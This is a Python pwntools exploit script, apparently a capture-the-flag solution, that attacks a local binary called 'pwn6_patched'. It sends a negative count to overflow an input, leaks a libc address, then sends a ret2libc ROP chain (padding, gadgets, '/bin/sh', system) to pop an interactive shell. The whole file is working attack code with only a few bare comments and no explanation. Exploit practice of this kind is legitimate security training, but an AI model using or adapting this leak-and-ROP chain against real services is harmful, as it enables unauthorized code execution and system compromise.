#!/usr/bin/env python3
from pwn import *

PORT = 13330
HOST = "127.0.0.1"
exe = context.binary = ELF('./pwn6_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	brva 0x0000000000001979
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()
# STAGE 1: Leak libc_base
def sla(after, pl):
	p.sendlineafter(after, pl)

def recvU(byte):
	p.recvuntil(byte)

sla(b">> ", str(1))
sla(b"[1-5]: ", str(6))
sla(b"Count: ", str(-1))
sla(b" [y/n]: ", b'y')

sla(b"soon: ", str(8))
p.sendafter(b"e-mail: ", b"A"*8)

recvU(b"A"*8)
libc.address = u64(p.recv(6) + b"\0\0") - 0x90e93
log.info("libc_base: " + hex(libc.address))
sla(b"[y/n]: ", b'y')

# STAGE 2: ret2libc
# GDB()
sla(b">> ", str(1))
sla(b"[1-5]: ", str(6))
sla(b"Count: ", str(-1))
sla(b" [y/n]: ", b'y')

sla(b"soon: ", str(120))

pl = flat(
	b"A"*0x58,
	libc.address + 0x0000000000022679,
	libc.address + 0x0000000000023b6a,
	next(libc.search(b"/bin/sh")),
	libc.sym.system
	)
print(len(pl))
p.sendafter(b"e-mail: ", pl)
sla(b"[y/n]: ", b'y')

p.interactive()